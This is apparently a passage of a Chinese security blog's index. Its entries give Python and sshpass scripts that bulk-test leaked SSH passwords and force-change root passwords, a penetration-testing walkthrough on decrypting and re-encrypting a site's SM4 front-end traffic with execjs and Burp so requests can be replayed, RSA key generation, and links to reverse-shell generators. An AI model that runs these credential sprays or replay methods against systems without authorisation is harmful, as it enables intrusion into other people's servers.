        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>安全运维过程发现大量机器的账号密码，经过一轮跟进修复，需要进行复查，最快的办法就是直接验证账号密码</p><h3 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h3><p>python3 ssh-yanzheng.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-  </span><br><span class="line">#!/usr/bin/python   </span><br><span class="line">import paramiko  </span><br><span class="line">import threading</span><br><span class="line">import xlrd</span><br><span class="line">import time </span><br><span class="line"></span><br><span class="line">def ssh2(ip,username,passwd):  </span><br><span class="line">    try:  </span><br><span class="line">        paramiko.util.log_to_file(&quot;filename.log&quot;)</span><br><span class="line">        ssh = paramiko.SSHClient()  </span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  </span><br><span class="line">        ssh.connect(ip,22,username,passwd,timeout=5)  </span><br><span class="line">        #stdin, stdout, stderr = ssh.exec_command(m)</span><br><span class="line">        #echo &quot;password&quot; | passwd testuser --stdin &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">        #echo testuser:password|chpasswd</span><br><span class="line">        #stdin,stdout,sterr=ssh.exec_command(&#x27;&#x27;)#</span><br><span class="line">        #stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’   </span><br><span class="line">        #out = stdout.readlines()  </span><br><span class="line">        #屏幕输出  </span><br><span class="line">        #for o in out:  </span><br><span class="line">        #    print o</span><br><span class="line">        print (&#x27;%s\tOK\n&#x27;%(ip))</span><br><span class="line">        fobj = open(&quot;success.txt&quot;,&#x27;a&#x27;)</span><br><span class="line">        #time=time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br><span class="line">        fobj.write(&quot;Successfully  password&quot;+ip+&quot; &quot;+username+&quot; &quot;+passwd+&quot;\n&quot;)</span><br><span class="line">        ssh.close()</span><br><span class="line">        fobj.close()</span><br><span class="line">    except :  </span><br><span class="line">        print (&#x27;%s\tError\n&#x27;%(ip))</span><br><span class="line">        fobj2= open(&quot;error.txt&quot;,&#x27;a&#x27;)</span><br><span class="line">        #time=time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br><span class="line">        fobj2.write(&quot;failed  password&quot;+ip+&quot; &quot;+username+&quot; &quot;+passwd+&quot;\n&quot;)</span><br><span class="line">        fobj2.close()</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    file=open(&#x27;ip2.txt&#x27;)</span><br><span class="line">    for line in file:</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        ip=str(line.split(&#x27;\t&#x27;)[0]) </span><br><span class="line">        username=str(line.split(&#x27;\t&#x27;)[1]).strip()</span><br><span class="line">        passwd=str(line.split(&#x27;\t&#x27;)[2]).strip()</span><br><span class="line">        print(ip+&quot; &quot;+username+&quot; &quot;+passwd)</span><br><span class="line">        a=threading.Thread(target=ssh2,args=(ip,username,passwd))</span><br><span class="line">        a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="强制修改"><a href="#强制修改" class="headerlink" title="强制修改"></a>强制修改</h3><p>对于没有修改密码的机器进行强制修改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-  </span><br><span class="line">#!/usr/bin/python   </span><br><span class="line">import paramiko  </span><br><span class="line">import threading</span><br><span class="line">import xlrd</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">def ssh2(ip,username,passwd,newpass,time):  </span><br><span class="line">    try:  </span><br><span class="line">        paramiko.util.log_to_file(&quot;filename.log&quot;)</span><br><span class="line">        ssh = paramiko.SSHClient()  </span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  </span><br><span class="line">        ssh.connect(ip,22,username,passwd,timeout=5)  </span><br><span class="line">        #stdin, stdout, stderr = ssh.exec_command(m)</span><br><span class="line">        #echo &quot;password&quot; | passwd testuser --stdin &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">        #echo testuser:password|chpasswd</span><br><span class="line">        #stdin,stdout,sterr=ssh.exec_command(&#x27;echo root:%s | chpasswd&#x27;%(newpass))#</span><br><span class="line">        stdin,stdout,sterr=ssh.exec_command(&#x27;passwd&#x27;)#</span><br><span class="line">        stdin,stdout,sterr=ssh.exec_command(&#x27;%s&#x27;%(passwd))#</span><br><span class="line">        stdin,stdout,sterr=ssh.exec_command(&#x27;%s&#x27;%(newpass))#</span><br><span class="line">        stdin,stdout,sterr=ssh.exec_command(&#x27;%s&#x27;%(newpass))#</span><br><span class="line">        stdin.write(passwd)</span><br><span class="line">        stdin.write(newpass)</span><br><span class="line">        stdin.write(newpass)</span><br><span class="line">        </span><br><span class="line">        stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’</span><br><span class="line">        out = stdout.readlines()  </span><br><span class="line">        #屏幕输出  </span><br><span class="line">        for o in out:  </span><br><span class="line">            print o</span><br><span class="line">        print &#x27;%s\tOK\n&#x27;%(ip)</span><br><span class="line">        fobj = open(&quot;success.txt&quot;,&#x27;a&#x27;)</span><br><span class="line">        time=time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br><span class="line">        fobj.write(time+&quot; &quot;+&quot;Successfully changed password&quot;+ip+&quot; &quot;+username+&quot; &quot;+passwd+&quot; &quot;+newpass+&quot;\r\n&quot;)</span><br><span class="line">        ssh.close()</span><br><span class="line">        fobj.close()</span><br><span class="line">    except :  </span><br><span class="line">        print &#x27;%s\tError\n&#x27;%(ip)</span><br><span class="line">        fobj2= open(&quot;error.txt&quot;,&#x27;a&#x27;)</span><br><span class="line">        time=time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br><span class="line">        fobj2.write(time+&quot; &quot;+&quot;failed changed password&quot;+ip+&quot; &quot;+username+&quot; &quot;+passwd+&quot; &quot;+newpass+&quot;\r\n&quot;)</span><br><span class="line">        fobj2.close()</span><br><span class="line">if __name__==&#x27;__main__&#x27;:  </span><br><span class="line">    book = xlrd.open_workbook(&quot;iplist.xlsx&quot;)</span><br><span class="line">    table = book.sheet_by_name(&#x27;Sheet1&#x27;)</span><br><span class="line">    sh = book.sheet_by_index(0)</span><br><span class="line">    for i in range(1,sh.nrows):</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        ip=table.cell(i,0).value</span><br><span class="line">        username = table.cell(i,1).value  #用户名</span><br><span class="line">        passwd = table.cell(i,2).value   #密码</span><br><span class="line">        newpasswd=table.cell(i,3).value    #新密码</span><br><span class="line">        print(ip+&quot; &quot;+username+&quot; &quot;+passwd+&quot; &quot;+newpasswd)</span><br><span class="line">        a=threading.Thread(target=ssh2,args=(ip,username,passwd,newpasswd,time))</span><br><span class="line">        a.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH批量操作</title>
      <link href="/2025/03/11/sshpass%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C/"/>
      <url>/2025/03/11/sshpass%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="sshpass"><a href="#sshpass" class="headerlink" title="sshpass"></a>sshpass</h2><p>sshpass 主要用于以下场景：</p><ul><li>‌<strong>批量操作</strong>‌：可以用于批量修改、添加日志清理工具的配置内容，进行批量修改基础数据等操作，且不影响生产环境。</li><li>‌<strong>自动化脚本</strong>‌：在 Shell 脚本中自动完成 SSH 连接和命令执行，避免了手动输入密码的繁琐过程。</li><li>‌<strong>远程管理</strong>‌：通过脚本自动化远程服务器的管理和维护任务，提高工作效率。</li></ul><h2 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h2><p>sshpass批量验证，可以验证密码是否正确，是否联网三种情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">port=22</span><br><span class="line">timeout=3</span><br><span class="line">cmd=&quot;curl www.baidu.com&quot;</span><br><span class="line">cmd2=&quot;exit&quot;</span><br><span class="line">logfile=&quot;/home/tmp/rs.txt&quot;</span><br><span class="line">exec &gt;$&#123;logfile&#125; ;</span><br><span class="line">cat ./ip2.txt | while read line</span><br><span class="line">do</span><br><span class="line">  HOST=`echo $&#123;line&#125;|cut -d &#x27;/&#x27; -f 1` ;</span><br><span class="line">  USER=`echo $&#123;line&#125;|cut -d &#x27;/&#x27; -f 2 `;</span><br><span class="line">  PASS=`echo $&#123;line&#125;|cut -d &#x27;/&#x27; -f 3`;</span><br><span class="line">  #echo $HOST</span><br><span class="line"> # echo $USER</span><br><span class="line">#  echo $PASS</span><br><span class="line">  echo &quot;========================================&quot;+$HOST+$USER&quot;===========================================&quot;</span><br><span class="line">  sshpass -p $PASS ssh -p $port -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout $USER@$HOST &lt;&lt; EOF</span><br><span class="line">  curl --connect-timeout 10 www.baidu.com</span><br><span class="line">  echo &quot;9999999999999999&quot;</span><br><span class="line">  ifconfig  | grep &quot;inet addr&quot; | awk &#x27;&#123; print $2&#125;&#x27; |grep -v &quot;127.0.0.1&quot;</span><br><span class="line">  exit </span><br><span class="line">EOF</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sh </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sh </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端JS解密</title>
      <link href="/2025/03/11/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86/"/>
      <url>/2025/03/11/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="请求进行了加密"><a href="#请求进行了加密" class="headerlink" title="请求进行了加密"></a>请求进行了加密</h2><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311214826570.png" alt="image-20250311214826570"></p><h2 id="定位入口"><a href="#定位入口" class="headerlink" title="定位入口"></a>定位入口</h2><p>拦截器关键字 ：interceptors.response，定位到SM4加密算法这里</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311214855566.png" alt="image-20250311214855566"></p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215056530.png" alt="image-20250311215056530"></p><h3 id="保存js文件"><a href="#保存js文件" class="headerlink" title="保存js文件"></a>保存js文件</h3><p>把加密的js文件保存下来 app.1736492616509.js</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215204745.png" alt="image-20250311215204745"></p><h3 id="错误："><a href="#错误：" class="headerlink" title="错误："></a>错误：</h3><p>ProgramError: ReferenceError: window is not defined</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215325859.png" alt="image-20250311215325859"></p><p>js开头补全（必须）：</p><p>window&#x3D;global</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215347124.png" alt="image-20250311215347124"></p><h3 id="注释掉这一行初始化不用各种补全"><a href="#注释掉这一行初始化不用各种补全" class="headerlink" title="注释掉这一行初始化不用各种补全"></a>注释掉这一行初始化不用各种补全</h3><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215411575.png" alt="image-20250311215411575"></p><h3 id="定位解密参数u"><a href="#定位解密参数u" class="headerlink" title="定位解密参数u"></a>定位解密参数u</h3><p>Object(u.b)(“SM4”, e.data))</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215435754.png" alt="image-20250311215435754"></p><p>断点调试，刷新页面找到js调用入口</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215458504.png" alt="image-20250311215458504"></p><p>直接加一行进行赋值 window.yuan&#x3D;o</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215517507.png" alt="image-20250311215517507"></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">新建main.js</span><br><span class="line"></span><br><span class="line">require(&quot;./app.1736492616509&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decode(e)&#123;</span><br><span class="line">u=window.yuan(&quot;7d92&quot;)</span><br><span class="line">ret =u.b(&quot;SM4&quot;,e.data)</span><br><span class="line">console.log(ret)</span><br><span class="line">return ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//decode(e)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">js.decrypt.py 直接调用</span><br><span class="line"></span><br><span class="line">import execjs</span><br><span class="line">res=&#123;post的数据&#125;</span><br><span class="line">e=&#123;&quot;data&quot;: res&#125;</span><br><span class="line">with open(&quot;main.js&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">    a=execjs.compile(f.read())</span><br><span class="line">    #result1=a.call(&#x27;md5&#x27;,&#x27;23jrsb292gbav92guvwg92rg&#x27;)</span><br><span class="line">    result1=a.call(&#x27;decode&#x27;,e)</span><br><span class="line">    print(result1)</span><br></pre></td></tr></table></figure><h3 id="IndexError-list-index-out-of-range"><a href="#IndexError-list-index-out-of-range" class="headerlink" title="IndexError: list index out of range"></a>IndexError: list index out of range</h3><p>修改代码utf-8</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215600044.png" alt="image-20250311215600044"></p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215624566.png" alt="image-20250311215624566"></p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215731144.png" alt="image-20250311215731144"></p><h2 id="接口加解密"><a href="#接口加解密" class="headerlink" title="接口加解密"></a>接口加解密</h2><p>burp–&gt;autoDecoder </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import execjs</span><br><span class="line">from flask import Flask,Response,request  </span><br><span class="line">import base64,hashlib,json  </span><br><span class="line">from pyDes import *  </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&quot;POST&quot;]) # 不解密  </span><br><span class="line">def decrypt():  </span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取  post 参数  </span><br><span class="line">    #print(&#x27;param&#x27;,param)</span><br><span class="line">    with open(&quot;main.js&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">        a=execjs.compile(f.read())</span><br><span class="line">        #result1=a.call(&#x27;md5&#x27;,&#x27;23jrsb292gbav92guvwg92rg&#x27;)</span><br><span class="line">        e=&#x27;&#123;&quot;data&quot;:&#x27;+param+&#x27;&#125;&#x27;</span><br><span class="line">        e=json.loads(e)</span><br><span class="line">        #print(&#x27;eeeeeee&#x27;,e)</span><br><span class="line">        result1=a.call(&#x27;decode1&#x27;,e)</span><br><span class="line">        print(&#x27;result1&#x27;,result1)</span><br><span class="line"></span><br><span class="line">    return result1  </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:  </span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug  </span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><h3 id="响应数据包解密"><a href="#响应数据包解密" class="headerlink" title="响应数据包解密"></a>响应数据包解密</h3><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311215849046.png" alt="image-20250311215849046"></p><h3 id="请求数据包解密再加密"><a href="#请求数据包解密再加密" class="headerlink" title="请求数据包解密再加密"></a>请求数据包解密再加密</h3><p>对请求数据进行解密，修改参数再进行加密就可以重放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def encrypt():  </span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取  post 参数  </span><br><span class="line">    print(&#x27;param&#x27;,param)</span><br><span class="line">    with open(&quot;main-en.js&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">        a=execjs.compile(f.read())</span><br><span class="line">        e=&#x27;&#x27;&#x27;</span><br><span class="line">&#123;&quot;method&quot;: &quot;post&quot;,</span><br><span class="line">    &quot;url&quot;: &quot;/queryRtalPhacBInfo&quot;,</span><br><span class="line">    &quot;data&quot;: &#x27;&#x27;&#x27; + param + &#x27;&#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">        e=json.loads(e)</span><br><span class="line">       #print(&#x27;eeeeeeee&#x27;,e)</span><br><span class="line">        result=a.call(&#x27;encode1&#x27;,e)</span><br><span class="line">        print(&#x27;result2222222&#x27;,result)      </span><br><span class="line">        # 提取 data 字段</span><br><span class="line">        data_str = result[&#x27;data&#x27;]</span><br><span class="line">        </span><br><span class="line">        # 删除反斜杠</span><br><span class="line">        cleaned_data_str = data_str.replace(&#x27;\\&#x27;, &#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 将清理后的字符串转换回 JSON 对象</span><br><span class="line">        cleaned_data = json.loads(cleaned_data_str)</span><br><span class="line">        </span><br><span class="line">        # 输出清理后的 data 部分</span><br><span class="line">        print(json.dumps(cleaned_data, indent=2))</span><br><span class="line">        </span><br><span class="line">        result=json.dumps(cleaned_data, indent=2)</span><br><span class="line">   </span><br><span class="line">    return result  </span><br></pre></td></tr></table></figure><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250312150514760.png" alt="image-20250312150514760"></p><h2 id="解密后"><a href="#解密后" class="headerlink" title="解密后"></a>解密后</h2><p>解密后数据不能直接重放</p><p><img src="/images/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86.assets/image-20250311222133548.png" alt="image-20250311222133548"></p><p>解密参数后，直接请求报错，删除以下请求头可直接发送</p><p><strong>删除：Content-Type: application&#x2F;json</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /testInfo HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Cookie: amap_local=450900</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0</span><br><span class="line">Accept: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> 外网渗透 </category>
          
          <category> 前端JS解密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密钥生成</title>
      <link href="/2025/03/11/%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90/"/>
      <url>/2025/03/11/%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><p>windows下已安装Git，有openssl</p><p>生成2048 bit的PEM格式的RSA Key：Key.pem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out Key.pem -f4 2048</span><br></pre></td></tr></table></figure><p>从私钥导出公钥：Key_pub.pem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in Key.pem -pubout -out Key_pub.pem</span><br></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import rsa</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 生成一个新的RSA密钥对</span><br><span class="line">private_key = rsa.generate_private_key(</span><br><span class="line">    backend=default_backend(),</span><br><span class="line">    public_exponent=65537,</span><br><span class="line">    key_size=2048</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"># 将私钥以二进制形式序列化</span><br><span class="line">private_key_bytes = private_key.private_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PrivateFormat.PKCS8,</span><br><span class="line">    encryption_algorithm=serialization.NoEncryption()</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"># 将私钥写入文件</span><br><span class="line">with open(&#x27;private_key.pem&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(private_key_bytes)</span><br><span class="line"> </span><br><span class="line"># 公钥也可以直接从私钥中提取</span><br><span class="line">public_key = private_key.public_key()</span><br><span class="line">public_key_bytes = public_key.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"># 将公钥写入文件</span><br><span class="line">with open(&#x27;public_key.pem&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(public_key_bytes)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具记录</title>
      <link href="/2025/03/11/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/03/11/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><table><thead><tr><th align="center">名称</th><th align="center">说明</th><th align="center">链接</th></tr></thead><tbody><tr><td align="center">CyberChef</td><td align="center">网络瑞士军刀——用于加密、编码、压缩和数据分析的 Web 应用程序</td><td align="center"><a href="https://github.com/gchq/CyberChef">https://github.com/gchq/CyberChef</a></td></tr><tr><td align="center">BerylEnigma</td><td align="center">渗透测试，密码学研究，CTF</td><td align="center"><a href="https://github.com/ffffffff0x/BerylEnigma">https://github.com/ffffffff0x/BerylEnigma</a></td></tr></tbody></table><h2 id="反向-Shell-生成器"><a href="#反向-Shell-生成器" class="headerlink" title="反向 Shell 生成器"></a>反向 Shell 生成器</h2><table><thead><tr><th align="center">名称</th><th align="center">说明</th><th align="center">链接</th></tr></thead><tbody><tr><td align="center">reverse-shell-generator</td><td align="center">具有大量功能的托管反向 Shell 生成器</td><td align="center"><a href="https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</a></td></tr><tr><td align="center">Hack-Tools</td><td align="center">浏览器扩展-反弹&#x2F;加密解密&#x2F;漏洞验证payload</td><td align="center"><a href="https://github.com/LasCC/Hack-Tools">https://github.com/LasCC/Hack-Tools</a></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
          <category> 实用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实用工具 </tag>
            
